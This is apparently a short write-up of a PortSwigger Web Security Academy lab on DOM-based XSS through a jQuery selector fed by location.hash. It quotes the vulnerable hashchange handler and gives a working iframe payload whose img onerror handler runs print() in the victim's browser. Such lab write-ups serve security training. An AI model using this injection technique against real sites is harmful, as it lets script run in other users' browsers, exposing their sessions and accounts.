
# DOM XSS in jQuery selector sink using a hashchange event

The home page has a DOM-based XSS issue because the URL fragment is incorporated into a jQuery selector after a hash-change event. It uses jQuery's $() selector function to auto-scroll to a given post, whose title is passed via the location.hash property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser.

---------------------------------------------

References:

- https://portswigger.net/web-security/cross-site-scripting/dom-based

---------------------------------------------


The home page contains the following code that handles changes to the URL fragment:

```
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```



<img width="815" height="90" alt="1" src="https://github.com/user-attachments/assets/238c4d14-7804-4502-a8b4-839dfafc592a" />


To exploit it, it is possible to use the same payload as in https://portswigger.net/web-security/cross-site-scripting/dom-based:

```
<iframe style="width:100%;height:100%" src="https://0ae000fe04dcc1068048c1f000ed005b.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print(1)>'">
```



<img width="1156" height="705" alt="2" src="https://github.com/user-attachments/assets/346c2e02-17af-40c3-ba4c-c1f8e92e7f5e" />

